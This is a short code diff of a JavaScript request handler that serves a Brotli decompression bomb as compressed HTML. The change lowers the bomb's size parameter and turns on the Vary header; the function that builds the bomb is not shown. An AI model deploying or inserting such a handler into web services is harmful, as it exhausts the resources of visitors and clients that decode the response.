@@ -27,7 +27,7 @@ function makeBrotliBombBase64(size) {
     return base64.join("");
 }
 
-const brotliBomb = base64ToArrayBuffer(makeBrotliBombBase64(2049));
+const brotliBomb = base64ToArrayBuffer(makeBrotliBombBase64(511));
 
 export default async function handleRequest(request) {
     // Get Accept-Encoding from request header
@@ -46,7 +46,7 @@ export default async function handleRequest(request) {
             "Content-Encoding": "br",
             "Content-Length": brotliBomb.byteLength.toString(),
             "Content-Type": "text/html",
-            // Vary: "Accept-Encoding",
+            Vary: "Accept-Encoding",
         },
     });
 }
